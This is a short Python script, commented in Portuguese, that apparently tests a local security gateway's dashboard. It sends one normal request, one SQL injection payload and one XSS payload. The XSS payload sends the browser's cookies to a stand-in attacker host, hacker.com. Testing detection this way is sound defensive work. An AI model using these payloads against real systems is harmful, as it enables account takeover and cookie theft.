import requests
import time

GATEWAY_URL = "http://localhost:4000/api/resource"

def send_request(name, payload):
    print(f"[*] Simulando {name}...")
    try:
        response = requests.post(GATEWAY_URL, json=payload)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Resposta: {response.json()}\n")
    except Exception as e:
        print(f"[!] Erro: {e}\n")

# 1. Requisição Normal
send_request("Requisição Legítima", {"user": "wilson", "action": "view_profile"})

time.sleep(2)

# 2. SQL Injection
send_request("Ataque SQL Injection", {"user": "admin' --", "password": "any"})

time.sleep(2)

# 3. XSS Attack
send_request("Ataque XSS", {"comment": "<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>"})

print("[!] Simulação concluída. Verifique o Dashboard!")
